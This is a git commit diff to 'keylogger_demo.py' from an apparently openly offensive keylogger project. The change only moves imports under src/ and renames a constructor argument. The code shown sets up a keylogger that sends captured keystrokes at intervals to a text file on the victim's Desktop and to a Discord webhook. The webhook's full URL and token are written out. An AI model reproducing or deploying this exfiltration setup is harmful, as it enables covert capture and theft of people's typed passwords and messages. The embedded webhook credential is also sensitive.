55c19032ad8167cd1f0105f80795f6b509b331cd
EONRaider <livewire_voodoo@protonmail.com>
2021-10-10 11:26:18 -0300

    Move file from src/

--- keylogger_demo.py
+++ keylogger_demo.py
@@ -6,8 +6,8 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 import platform
 from pathlib import Path
 
-from keylogger import KeyLogger
-from exfiltrators import Discord, Screen, TextFile
+from src.keylogger import KeyLogger
+from src.exfiltrators import Discord, Screen, TextFile
 
 
 current_os = platform.system()
@@ -20,15 +20,14 @@ demo_file = {
 keylogger = KeyLogger(exfil_time=120)
 
 # Enabling STDOUT for demonstration/debugging purposes only
-Screen(subject=keylogger)
+Screen(keylogger=keylogger)
 
 # A demonstration file will be written to the current user's Desktop
-TextFile(subject=keylogger,
+TextFile(keylogger=keylogger,
          file_path=Path.home().joinpath(demo_file[current_os]))
 
 # Captured data will be sent to a Discord server through a Webhook URL
-Discord(subject=keylogger,
-        host_name=platform.node(),
+Discord(keylogger=keylogger,
         webhook_url="https://discord.com/api/webhooks/896081552151306340/"
                     "ikFf8J24Yk1VWjMBMP_tjrcNHFuaIZWp0la8zoeZn1QAaQa93x7e"
                     "S24cFreKbfKyo49e")
